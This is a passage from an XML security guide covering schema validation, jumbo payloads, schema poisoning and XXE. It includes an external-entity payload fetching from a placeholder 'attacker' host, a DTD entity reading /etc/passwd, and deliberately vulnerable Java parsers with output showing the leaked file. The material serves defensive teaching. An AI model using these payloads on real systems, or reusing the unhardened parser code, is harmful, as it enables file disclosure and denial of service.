  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">"xs:string"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"January"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"February"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"March"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"April"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"May"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"June"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"July"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"August"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"September"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"October"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"November"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:enumeration</span> <span class="na">value=</span><span class="s">"December"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div></div>

<p>By limiting the month element’s value to any of the previous values, the application will not be manipulating random strings.</p>

<h4 id="ranges">Ranges</h4>

<p>Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"name"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">"xs:string"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:minLength</span> <span class="na">value=</span><span class="s">"3"</span><span class="nt">/&gt;</span>
   <span class="nt">&lt;xs:maxLength</span> <span class="na">value=</span><span class="s">"256"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div></div>

<p>In cases where the possible values are restricted to a certain specific length (let’s say 8), this value can be specified as follows to be valid:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"name"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">"xs:string"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:length</span> <span class="na">value=</span><span class="s">"8"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div></div>

<h4 id="patterns">Patterns</h4>

<p>Certain elements or attributes may follow a specific syntax. You can add <code class="language-plaintext highlighter-rouge">pattern</code> restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific <code class="language-plaintext highlighter-rouge">pattern</code>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"SSN"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">"xs:token"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:pattern</span> <span class="na">value=</span><span class="s">"[0-9]{3}-[0-9]{2}-[0-9]{4}"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div></div>

<p>Only numbers between <code class="language-plaintext highlighter-rouge">000-00-0000</code> and <code class="language-plaintext highlighter-rouge">999-99-9999</code> will be allowed as values for a SSN.</p>

<h4 id="assertions">Assertions</h4>

<p>Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable <code class="language-plaintext highlighter-rouge">$value</code> can be used to reference the contents of the value being analyzed. The <em>Divide by Zero</em> section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an <code class="language-plaintext highlighter-rouge">assertion</code> disallowing the number zero:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"denominator"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:simpleType&gt;</span>
  <span class="nt">&lt;xs:restriction</span> <span class="na">base=</span><span class="s">"xs:integer"</span><span class="nt">&gt;</span>
   <span class="nt">&lt;xs:assertion</span> <span class="na">test=</span><span class="s">"$value != 0"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xs:restriction&gt;</span>
 <span class="nt">&lt;/xs:simpleType&gt;</span>
<span class="nt">&lt;/xs:element&gt;</span>
</code></pre></div></div>

<p>The assertion guarantees that the <code class="language-plaintext highlighter-rouge">denominator</code> will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.</p>

<h4 id="occurrences">Occurrences</h4>

<p>The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: <code class="language-plaintext highlighter-rouge">minOccurs</code> and <code class="language-plaintext highlighter-rouge">maxOccurs</code>. The default value for both the <code class="language-plaintext highlighter-rouge">minOccurs</code> and the <code class="language-plaintext highlighter-rouge">maxOccurs</code> attributes is <code class="language-plaintext highlighter-rouge">1</code>, but certain elements may require other values. For instance, if a value is optional, it could contain a <code class="language-plaintext highlighter-rouge">minOccurs</code> of 0, and if there is no limit on the maximum amount, it could contain a <code class="language-plaintext highlighter-rouge">maxOccurs</code> of <code class="language-plaintext highlighter-rouge">unbounded</code>, as in the following example:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:schema</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"operation"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:complexType&gt;</span>
   <span class="nt">&lt;xs:sequence&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"buy"</span> <span class="na">maxOccurs=</span><span class="s">"unbounded"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;xs:complexType&gt;</span>
      <span class="nt">&lt;xs:all&gt;</span>
       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"id"</span> <span class="na">type=</span><span class="s">"xs:integer"</span><span class="nt">/&gt;</span>
       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"price"</span> <span class="na">type=</span><span class="s">"xs:decimal"</span><span class="nt">/&gt;</span>
       <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"quantity"</span> <span class="na">type=</span><span class="s">"xs:integer"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;/xs:all&gt;</span>
     <span class="nt">&lt;/xs:complexType&gt;</span>
    <span class="nt">&lt;/xs:element&gt;</span>
  <span class="nt">&lt;/xs:complexType&gt;</span>
 <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div></div>

<p>The previous schema includes a root element named <code class="language-plaintext highlighter-rouge">operation</code>, which can contain an unlimited (<code class="language-plaintext highlighter-rouge">unbounded</code>) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an <code class="language-plaintext highlighter-rouge">unbounded</code> value.</p>

<h2 id="jumbo-payloads">Jumbo Payloads</h2>

<p>Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.</p>

<h3 id="traditional-jumbo-payloads">Traditional Jumbo Payloads</h3>

<p>There are two primary methods to make a document larger than normal:</p>

<ul>
  <li>Depth attack: using a huge number of elements, element names, and/or element values.</li>
  <li>Width attack: using a huge number of attributes, attribute names, and/or attribute values.</li>
</ul>

<p>In most cases, the overall result will be a huge document. This is a short example of what this looks like:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;SOAPENV:ENVELOPE</span> <span class="na">XMLNS:SOAPENV=</span><span class="s">"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"</span> 
                  <span class="na">XMLNS:EXT=</span><span class="s">"HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;SOAPENV:HEADER</span> <span class="na">LARGENAME1=</span><span class="s">"LARGEVALUE"</span> 
                 <span class="na">LARGENAME2=</span><span class="s">"LARGEVALUE2"</span> 
                 <span class="na">LARGENAME3=</span><span class="s">"LARGEVALUE3"</span> <span class="err">…</span><span class="nt">&gt;</span>
 ...
</code></pre></div></div>

<h3 id="small-jumbo-payloads">“Small” Jumbo Payloads</h3>

<p>The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [
 &lt;!ENTITY file SYSTEM "http://attacker/huge.xml" &gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div></div>

<h2 id="schema-poisoning">Schema Poisoning</h2>

<p>When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.</p>

<h3 id="local-schema-poisoning">Local Schema Poisoning</h3>

<p>Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document .</p>

<h4 id="embedded-schema">Embedded Schema</h4>

<p>The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C :</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE note [
 &lt;!ELEMENT note (to,from,heading,body)&gt;</span>
 <span class="cp">&lt;!ELEMENT to (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT from (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT heading (#PCDATA)&gt;</span>
 <span class="cp">&lt;!ELEMENT body (#PCDATA)&gt;</span>
]&gt;
<span class="nt">&lt;note&gt;</span>
 <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
 <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
 <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
 <span class="nt">&lt;body&gt;</span>Don't forget me this weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div></div>

<p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</p>

<h4 id="incorrect-permissions">Incorrect Permissions</h4>

<p>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span>
<span class="nt">&lt;note&gt;</span>
 <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
 <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
 <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
 <span class="nt">&lt;body&gt;</span>Don't forget me this weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div></div>

<p>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
</code></pre></div></div>

<p>The permissions set on <code class="language-plaintext highlighter-rouge">name.dtd</code> allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.</p>

<h3 id="remote-schema-poisoning">Remote Schema Poisoning</h3>

<p>Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network’s traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.</p>

<h4 id="man-in-the-middle-mitm-attack">Man-in-the-Middle (MitM) Attack</h4>

<p>When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE note SYSTEM "http://example.com/note.dtd"&gt;</span>
<span class="nt">&lt;note&gt;</span>
 <span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
 <span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
 <span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
 <span class="nt">&lt;body&gt;</span>Don't forget me this weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div></div>

<p>The remote file <code class="language-plaintext highlighter-rouge">note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>

<h4 id="dns-cache-poisoning">DNS-Cache Poisoning</h4>

<p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.</p>

<p>The previous example referenced the host <code class="language-plaintext highlighter-rouge">example.com</code> using an unencrypted protocol.</p>

<p>When switching to HTTPS, the location of the remote schema will look like <code class="language-plaintext highlighter-rouge">https://example/note.dtd</code>. In a normal scenario, the IP of <code class="language-plaintext highlighter-rouge">example.com</code> resolves to <code class="language-plaintext highlighter-rouge">1.1.1.1</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>host example.com
example.com has address 1.1.1.1
</code></pre></div></div>

<p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code class="language-plaintext highlighter-rouge">2.2.2.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>host example.com
example.com has address 2.2.2.2
</code></pre></div></div>

<p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>

<h4 id="evil-employee-attack">Evil Employee Attack</h4>

<p>When third parties host and define schemas, the contents are not under the control of the schemas’ users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>).</p>

<h2 id="xml-entity-expansion">XML Entity Expansion</h2>

<p>If the parser uses a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>, an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.</p>

<h3 id="sample-vulnerable-java-implementations">Sample Vulnerable Java Implementations</h3>

<p>Using the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.</p>

<p><strong>Sample XML</strong></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE contacts SYSTEM "contacts.dtd"&gt;</span>
<span class="nt">&lt;contacts&gt;</span>
 <span class="nt">&lt;contact&gt;</span>
  <span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span> 
  <span class="nt">&lt;lastname&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/lastname&gt;</span>
 <span class="nt">&lt;/contact&gt;</span> 
<span class="nt">&lt;/contacts&gt;</span>
</code></pre></div></div>

<p><strong>Sample DTD</strong></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ELEMENT contacts (contact*)&gt;</span>
<span class="cp">&lt;!ELEMENT contact (firstname,lastname)&gt;</span>
<span class="cp">&lt;!ELEMENT firstname (#PCDATA)&gt;</span>
<span class="cp">&lt;!ELEMENT lastname ANY&gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt;</span>
</code></pre></div></div>

<h4 id="xxe-using-dom">XXE using DOM</h4>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.Document</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.Element</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.Node</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.w3c.dom.NodeList</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">parseDocument</span> <span class="o">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">try</span> <span class="o">{</span>
   <span class="nc">DocumentBuilderFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="nc">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
   <span class="nc">DocumentBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
   <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputSource</span><span class="o">(</span><span class="s">"contacts.xml"</span><span class="o">));</span>
   <span class="nc">NodeList</span> <span class="n">nodeList</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getElementsByTagName</span><span class="o">(</span><span class="s">"contact"</span><span class="o">);</span>
   <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">nodeList</span><span class="o">.</span><span class="na">getLength</span><span class="o">();</span> <span class="n">s</span><span class="o">++)</span> <span class="o">{</span>
     <span class="nc">Node</span> <span class="n">firstNode</span> <span class="o">=</span> <span class="n">nodeList</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
     <span class="k">if</span> <span class="o">(</span><span class="n">firstNode</span><span class="o">.</span><span class="na">getNodeType</span><span class="o">()</span> <span class="o">==</span> <span class="nc">Node</span><span class="o">.</span><span class="na">ELEMENT_NODE</span><span class="o">)</span> <span class="o">{</span>
       <span class="nc">Element</span> <span class="n">firstElement</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Element</span><span class="o">)</span> <span class="n">firstNode</span><span class="o">;</span>
       <span class="nc">NodeList</span> <span class="n">firstNameElementList</span> <span class="o">=</span> <span class="n">firstElement</span><span class="o">.</span><span class="na">getElementsByTagName</span><span class="o">(</span><span class="s">"firstname"</span><span class="o">);</span>
       <span class="nc">Element</span> <span class="n">firstNameElement</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Element</span><span class="o">)</span> <span class="n">firstNameElementList</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
       <span class="nc">NodeList</span> <span class="n">firstName</span> <span class="o">=</span> <span class="n">firstNameElement</span><span class="o">.</span><span class="na">getChildNodes</span><span class="o">();</span>
       <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"First Name: "</span>  <span class="o">+</span> <span class="o">((</span><span class="nc">Node</span><span class="o">)</span> <span class="n">firstName</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">)).</span><span class="na">getNodeValue</span><span class="o">());</span>
       <span class="nc">NodeList</span> <span class="n">lastNameElementList</span> <span class="o">=</span> <span class="n">firstElement</span><span class="o">.</span><span class="na">getElementsByTagName</span><span class="o">(</span><span class="s">"lastname"</span><span class="o">);</span>
       <span class="nc">Element</span> <span class="n">lastNameElement</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Element</span><span class="o">)</span> <span class="n">lastNameElementList</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
       <span class="nc">NodeList</span> <span class="n">lastName</span> <span class="o">=</span> <span class="n">lastNameElement</span><span class="o">.</span><span class="na">getChildNodes</span><span class="o">();</span>
       <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Last Name: "</span> <span class="o">+</span> <span class="o">((</span><span class="nc">Node</span><span class="o">)</span> <span class="n">lastName</span><span class="o">.</span><span class="na">item</span><span class="o">(</span><span class="mi">0</span><span class="o">)).</span><span class="na">getNodeValue</span><span class="o">());</span>
     <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
  <span class="o">}</span>
 <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>The previous code produces the following output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>javac parseDocument.java <span class="p">;</span> java parseDocument
First Name: John
Last Name: <span class="c">### User Database</span>
...
nobody:<span class="k">*</span>:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:<span class="k">*</span>:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div></div>

<h4 id="xxe-using-dom4j">XXE using DOM4J</h4>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.dom4j.Document</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.DocumentException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.io.SAXReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.io.OutputFormat</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.dom4j.io.XMLWriter</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test1</span> <span class="o">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
  <span class="nc">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
  <span class="k">try</span> <span class="o">{</span>
   <span class="nc">SAXReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXReader</span><span class="o">();</span>
   <span class="n">document</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="s">"contacts.xml"</span><span class="o">);</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
  <span class="o">}</span> 
  <span class="nc">OutputFormat</span> <span class="n">format</span> <span class="o">=</span> <span class="nc">OutputFormat</span><span class="o">.</span><span class="na">createPrettyPrint</span><span class="o">();</span>
  <span class="k">try</span> <span class="o">{</span>
   <span class="nc">XMLWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLWriter</span><span class="o">(</span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">,</span> <span class="n">format</span> <span class="o">);</span>
   <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span> <span class="n">document</span> <span class="o">);</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
  <span class="o">}</span>
 <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>The previous code produces the following output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java test1
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;<span class="o">!</span>DOCTYPE contacts SYSTEM <span class="s2">"contacts.dtd"</span><span class="o">&gt;</span>

&lt;contacts&gt;
 &lt;contact&gt;
  &lt;firstname&gt;John&lt;/firstname&gt;
  &lt;lastname&gt;### User Database
...
nobody:<span class="k">*</span>:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:<span class="k">*</span>:0:0:System Administrator:/var/root:/bin/sh
</code></pre></div></div>

<h4 id="xxe-using-sax">XXE using SAX</h4>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">parseDocument</span> <span class="kd">extends</span> <span class="nc">DefaultHandler</span> <span class="o">{</span>
 <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
  <span class="k">new</span> <span class="nf">parseDocument</span><span class="o">();</span>
 <span class="o">}</span>
 <span class="kd">public</span> <span class="nf">parseDocument</span><span class="o">()</span> <span class="o">{</span>
  <span class="k">try</span> <span class="o">{</span>
   <span class="nc">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="nc">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
   <span class="nc">SAXParser</span> <span class="n">parser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
   <span class="n">parser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"contacts.xml"</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
